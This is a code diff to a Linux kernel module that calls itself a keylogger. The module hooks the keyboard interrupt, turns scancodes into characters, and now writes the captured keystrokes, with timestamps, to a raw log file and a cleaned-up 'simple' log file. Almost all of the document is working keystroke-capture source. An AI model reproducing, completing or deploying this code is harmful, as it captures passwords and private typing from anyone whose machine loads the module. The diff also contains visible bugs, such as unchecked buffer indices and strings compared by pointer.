@@ -16,13 +16,8 @@
 #endif
 
 // keyboard constants/variables
-#define KBD_INPUT_PORT	0x60    /* address of keyboard input buffer */
-#define LEFT_SHIFT 0x2a
-#define RIGHT_SHIFT 0x36
-#define LEFT_SHIFT_RELEASE 0xaa
-#define RIGHT_SHIFT_RELEASE 0xb6
+#define KBD_INPUT_PORT	0x60    // address of keyboard input buffer
 int shiftPressed = 0;
-#define CAPS_LOCK 0x3a
 int capsLockEnabled = 0;
 #define NORMAL_MODE 0
 #define SHIFT_MODE 1
@@ -31,17 +26,31 @@ int capsLockEnabled = 0;
 #define NUMBER_OF_MODES 3
 unsigned char previousScancode = 0;
 
+// some hard-coded keyboard character hex codes
+#define LEFT_SHIFT 0x2a
+#define RIGHT_SHIFT 0x36
+#define LEFT_SHIFT_RELEASE 0xaa
+#define RIGHT_SHIFT_RELEASE 0xb6
+#define CAPS_LOCK 0x3a
+#define SPACE 0x39
+#define ENTER 0x1c
+#define BACKSPACE 0x0e
+
 // output file constants/variables
 #define OUTPUT_MODE 0644
-const char* path = "./output.txt"; //temporary
-struct file *outfile;
+const char* raw_path = "./raw_output.txt";
+const char* simple_path = "./simple_output.txt"; // doesn't include keys such as CAPSLOCK or SHIFT in the output file
+struct file *raw_outfile;
+struct file *simple_outfile;
 int count = 0;
 //char* path;
 
 // character buffer variables
 #define B_SIZE 1000
-char* char_buffer[B_SIZE];
-int pos = 0;
+char* raw_char_buffer[B_SIZE];
+char* simple_char_buffer[B_SIZE];
+int raw_pos = 0;
+int simple_pos = 0;
 int rollover = 0;
 struct mutex buffer_mutex; // used whenever the character buffer is modified
 
@@ -53,12 +62,13 @@ static ktime_t ts_period;
 char timestamp[TS_SIZE];
 
 // FUNCTION PROTOTYPES
-struct file *createFile(const char *path);
-int writeToFile(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size);
-void closeFile(struct file *file);
+struct file *create_file(const char *path);
+int write_to_file(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size);
+void close_file(struct file *file);
 static irqreturn_t get_scancode(int irq, void *id);
 void scancode_to_key(char scancode);
 int get_mode_index(char scancode);
+void write_to_simple_buffer(char scancode, char* key);
 void check_shift_and_caps(unsigned char scancode);
 void write_buffer_to_output(void);
 void generate_timestamp(void);
@@ -78,7 +88,7 @@ char *scancodes[][NUMBER_OF_MODES] = {
 	{"5", "%", "5"}, 		{"6", "^", "6"}, 		{"7", "&", "7"}, 
 	{"8", "*", "8"}, 		{"9", "(", "9"}, 		{"0", ")", "0"}, 
 	{"-","_", "-"}, 		{"=", "+", "="}, 		{"BKSP", "BKSP", "BKSP"}, 
-	{"TAB", "TAB", "TAB"}, 		{"q", "Q", "Q"}, 		{"w", "W", "W"},
+	{"\t", "\t", "\t"}, 		{"q", "Q", "Q"}, 		{"w", "W", "W"},
 	{"e", "E", "E"}, 		{"r","R", "R"}, 		{"t", "T", "T"}, 
 	{"y", "Y", "Y"}, 		{"u", "U", "U"}, 		{"i","I", "I"}, 
 	{"o", "O", "O"},		{"p", "P", "P"},		{"[", "{", "["}, 
@@ -109,7 +119,7 @@ char *scancodes[][NUMBER_OF_MODES] = {
 	{"F11", "F11", "F11"}, 		{"F12", "F12", "F12"} };                              
 
 // Create the output file
-struct file *createFile(const char *path) 
+struct file *create_file(const char *path) 
 {
     struct file *fileP = NULL;
     mm_segment_t oldFileSpace;
@@ -127,7 +137,7 @@ struct file *createFile(const char *path)
 }
 
 // Write to the output file
-int writeToFile(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size) 
+int write_to_file(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size) 
 {
     mm_segment_t oldFileSpace;
     int ret;
@@ -142,7 +152,7 @@ int writeToFile(struct file *file, unsigned long long offset, unsigned char *dat
 }
 
 // Close the output file
-void closeFile(struct file *file) 
+void close_file(struct file *file) 
 {
     filp_close(file, NULL);
 }
@@ -160,6 +170,7 @@ static irqreturn_t get_scancode(int irq, void *id)
 // converts a scancode to the appropriate key in the scancodes array
 void scancode_to_key(char scancode)
 {
+	char* key;
 	if (scancodes[scancode][0] != '\0')
 	{
 		mutex_lock(&buffer_mutex);
@@ -167,36 +178,41 @@ void scancode_to_key(char scancode)
 		if (capsLockEnabled == 1 && shiftPressed == 0) // only caps lock enabled
 		{
 			printk("%s\n", scancodes[scancode][CAPS_LOCK_MODE]);
-			char_buffer[pos] = scancodes[scancode][CAPS_LOCK_MODE];
+			raw_char_buffer[raw_pos] = scancodes[scancode][CAPS_LOCK_MODE];
+			key = scancodes[scancode][CAPS_LOCK_MODE];
 		}
 
 		else if (capsLockEnabled == 1 && shiftPressed == 1) // both caps lock and shift enabled
 		{
 			int mode = get_mode_index(scancode);
 			printk("%s\n", scancodes[scancode][mode]);
-			char_buffer[pos] = scancodes[scancode][mode];
+			raw_char_buffer[raw_pos] = scancodes[scancode][mode];
+			key = scancodes[scancode][mode];
 		}
-
 
 		else if (capsLockEnabled == 0 && shiftPressed == 1) // only shift enabled
 		{
 			printk("%s\n", scancodes[scancode][SHIFT_MODE]);
-			char_buffer[pos] = scancodes[scancode][SHIFT_MODE];
+			raw_char_buffer[raw_pos] = scancodes[scancode][SHIFT_MODE];
+			key = scancodes[scancode][SHIFT_MODE];
 		}
 
 		else // neither caps lock or shift enabled
 		{
 			printk("%s\n", scancodes[scancode][NORMAL_MODE]);
-			char_buffer[pos] = scancodes[scancode][NORMAL_MODE];
+			raw_char_buffer[raw_pos] = scancodes[scancode][NORMAL_MODE];
+			key = scancodes[scancode][NORMAL_MODE];
 		}
 
-		pos++;
+		raw_pos++;
 
-		if (pos >= B_SIZE) 
+		if (raw_pos >= B_SIZE) 
 		{
-			pos = 0;
+			raw_pos = 0;
 			rollover++;
 		}
+
+		write_to_simple_buffer(scancode, key);
 
 		mutex_unlock(&buffer_mutex);
 	}
@@ -226,6 +242,48 @@ int get_mode_index(char scancode)
 
 	return index;
 }
+
+// places character into simple buffer if it is an accepted character
+void write_to_simple_buffer(char scancode, char* key)
+{
+	int range1_min = 0x02; // 1 to =
+	int range1_max = 0x0d;
+
+	int range2_min = 0x0f; // q to \n
+	int range2_max = 0x1c;
+	
+	int range3_min = 0x1e; // a to ~
+	int range3_max = 0x29;
+
+	int range4_min = 0x2b; // \ to /
+	int range4_max = 0x35;
+
+	if ((scancode >= range1_min && scancode <= range1_max) ||
+		(scancode >= range2_min && scancode <= range2_max) ||
+		(scancode >= range3_min && scancode <= range3_max) ||
+		(scancode >= range4_min && scancode <= range4_max) ||
+		scancode == SPACE || scancode == BACKSPACE)
+	{
+		if (scancode == ENTER)
+		{
+			simple_char_buffer[simple_pos] = "\n";
+			simple_pos++;
+		}
+
+		else if (scancode == BACKSPACE)
+		{
+			simple_pos--;
+			simple_char_buffer[simple_pos] = "\0";
+		}
+
+		else
+		{
+			simple_char_buffer[simple_pos] = key;
+			simple_pos++;
+		}
+	}
+}
+
 
 // checks if shift or caps lock were pressed
 void check_shift_and_caps(unsigned char scancode)
@@ -270,21 +328,32 @@ void write_buffer_to_output(void)
  
 	if (rollover == 0)
 	{
-		max_size = pos;
+		max_size = raw_pos;
 	}
 
+	// write raw buffer to output
 	while (i < max_size)
 	{
-		writeToFile(outfile, 0, char_buffer[i], strlen(char_buffer[i]));
-		if(char_buffer[i]  == " " || char_buffer[i] == "/L"){
+		write_to_file(raw_outfile, 0, raw_char_buffer[i], strlen(raw_char_buffer[i]));
+		if(raw_char_buffer[i]  == " ") {
 		  count++;
 		}
 		i++;
 	}
+
+	// write simple buffer to output
+	i = 0;
+	while (i < simple_pos)
+	{
+		write_to_file(simple_outfile, 0, simple_char_buffer[i], strlen(simple_char_buffer[i]));
+		i++;
+	}
 	
 	display_count += count;
-	writeToFile(outfile, 0, display_count, 1);
-	printk("Character buffer written to output.\n");
+	write_to_file(raw_outfile, 0, display_count, 1);
+	printk("Character buffers written to output.\n");
+	printk("Raw character buffer written to %s.\n", raw_path);
+	printk("Simple character buffer written to %s.\n", simple_path);
 }
 
 // generates a timestamp string in the form [hh:mm:ss]
@@ -292,9 +361,9 @@ void generate_timestamp(void)
 {
 	long total_sec;
 	int hr, min, sec;
-    struct timeval time;
+	struct timeval time;
 
-    do_gettimeofday(&time);
+	do_gettimeofday(&time);
 	total_sec = time.tv_sec;
 
 	sec = total_sec % 60;
@@ -316,7 +385,7 @@ static void initialize_timers(void)
 	hrtimer_start(&ts_timer, ts_period, HRTIMER_MODE_REL);
 }
 
-// adds a timestamp to the output file every 15 seconds and restarts the timestamp timer 
+// adds a timestamp to the output files every 15 seconds and restarts the timestamp timer 
 static enum hrtimer_restart print_timestamp(struct hrtimer * timer)
 {
 	char code;
@@ -324,27 +393,38 @@ static enum hrtimer_restart print_timestamp(struct hrtimer * timer)
 	generate_timestamp();
 
 	code = timestamp[0];
-	char_buffer[pos] = scancodes[get_timestamp_index(code)][0];
+	raw_char_buffer[raw_pos] = scancodes[get_timestamp_index(code)][0];
+	simple_char_buffer[simple_pos] = scancodes[get_timestamp_index(code)][0];
 	code = timestamp[1];
-	char_buffer[pos+1] = scancodes[get_timestamp_index(code)][0];
+	raw_char_buffer[raw_pos+1] = scancodes[get_timestamp_index(code)][0];
+	simple_char_buffer[simple_pos+1] = scancodes[get_timestamp_index(code)][0];
 	code = timestamp[2];
-	char_buffer[pos+2] = scancodes[get_timestamp_index(code)][0];
+	raw_char_buffer[raw_pos+2] = scancodes[get_timestamp_index(code)][0];
+	simple_char_buffer[simple_pos+2] = scancodes[get_timestamp_index(code)][0];
 	code = timestamp[3];
-	char_buffer[pos+3] = scancodes[get_timestamp_index(code)][1];
+	raw_char_buffer[raw_pos+3] = scancodes[get_timestamp_index(code)][1];
+	simple_char_buffer[simple_pos+3] = scancodes[get_timestamp_index(code)][1];
 	code = timestamp[4];
-	char_buffer[pos+4] = scancodes[get_timestamp_index(code)][0];
+	raw_char_buffer[raw_pos+4] = scancodes[get_timestamp_index(code)][0];
+	simple_char_buffer[simple_pos+4] = scancodes[get_timestamp_index(code)][0];
 	code = timestamp[5];
-	char_buffer[pos+5] = scancodes[get_timestamp_index(code)][0];
+	raw_char_buffer[raw_pos+5] = scancodes[get_timestamp_index(code)][0];
+	simple_char_buffer[simple_pos+5] = scancodes[get_timestamp_index(code)][0];
 	code = timestamp[6];
-	char_buffer[pos+6] = scancodes[get_timestamp_index(code)][1];
+	raw_char_buffer[raw_pos+6] = scancodes[get_timestamp_index(code)][1];
+	simple_char_buffer[simple_pos+6] = scancodes[get_timestamp_index(code)][1];
 	code = timestamp[7];
-	char_buffer[pos+7] = scancodes[get_timestamp_index(code)][0];
+	raw_char_buffer[raw_pos+7] = scancodes[get_timestamp_index(code)][0];
+	simple_char_buffer[simple_pos+7] = scancodes[get_timestamp_index(code)][0];
 	code = timestamp[8];
-	char_buffer[pos+8] = scancodes[get_timestamp_index(code)][0];
+	raw_char_buffer[raw_pos+8] = scancodes[get_timestamp_index(code)][0];
+	simple_char_buffer[simple_pos+8] = scancodes[get_timestamp_index(code)][0];
 	code = timestamp[9];
-	char_buffer[pos+9] = scancodes[get_timestamp_index(code)][0];
+	raw_char_buffer[raw_pos+9] = scancodes[get_timestamp_index(code)][0];
+	simple_char_buffer[simple_pos+9] = scancodes[get_timestamp_index(code)][0];
 
-	pos = pos + TS_SIZE;
+	raw_pos = raw_pos + TS_SIZE;
+	simple_pos = simple_pos + TS_SIZE;
 
 	mutex_unlock(&buffer_mutex);
 
@@ -415,7 +495,8 @@ int __init init_keylogger(void)
 {
 	printk(KERN_INFO "Hello! Keylogger module successfully loaded.\n");
 	mutex_init(&buffer_mutex);
-	outfile = createFile(path);
+	raw_outfile = create_file(raw_path);
+	simple_outfile = create_file(simple_path);
 	generate_timestamp();
 	initialize_timers();
 	request_irq(1, get_scancode, IRQF_SHARED, "kbd2", (void *)get_scancode);
@@ -427,7 +508,8 @@ void __exit exit_module(void)
 	printk(KERN_INFO "Exiting keylogger kernel module.\n");
 	free_irq(1, (void *)get_scancode);
 	write_buffer_to_output();
-	closeFile(outfile);
+	close_file(raw_outfile);
+	close_file(simple_outfile);
 	remove_timers();	
 	return;
 }
